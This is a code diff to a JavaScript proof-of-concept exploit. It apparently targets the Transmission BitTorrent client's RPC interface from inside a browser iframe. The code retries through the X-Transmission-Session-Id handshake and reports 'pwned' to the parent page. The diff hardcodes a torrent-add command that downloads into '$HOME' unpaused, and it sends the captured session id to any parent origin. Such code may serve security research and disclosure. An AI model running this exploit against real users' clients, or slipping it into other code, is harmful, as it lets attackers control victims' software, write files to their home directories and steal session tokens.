@@ -3,7 +3,14 @@ var frame;
 var sessionid;
 var xhr;
 var interval = 60000;
-var command = "{}";
+var command = JSON.stringify({
+		method: "torrent-add",
+		arguments: {
+			"download-dir": "$HOME",
+			filename: "hello.torrent",
+			paused: false
+		}
+	});
 
 function sendRpc() {
 	xhr = new XMLHttpRequest();
@@ -28,9 +35,10 @@ function sendRpc() {
 
 	if (xhr.status == 200) {
 		clearInterval(timer);
-		window.parent.postMessage({status: "pwned", response: xhr.responseText}, "*"); 
+		window.parent.postMessage({status: "pwned", response: xhr.responseText}, "*");
 	} else if (xhr.status == 409) {
 		sessionid = xhr.getResponseHeader("X-Transmission-Session-Id")
+		window.parent.postMessage({status: "session", sessionid: sessionid }, "*")
 		sendRpc();
 	} else if (xhr.status == 401) {
 		clearInterval(timer);
@@ -50,10 +58,7 @@ window.addEventListener("message", function (e) {
 	case "interval":
 		interval = parseInt(e.data.param) * 1000;
 		break;
-	case "command":
-		command = e.data.param;
-		break;
-    case "stop":
+	case "stop":
 		clearInterval(timer);
 		break;
 	case "start":
@@ -62,5 +67,3 @@ window.addEventListener("message", function (e) {
         break;
 	}
 });
-
-
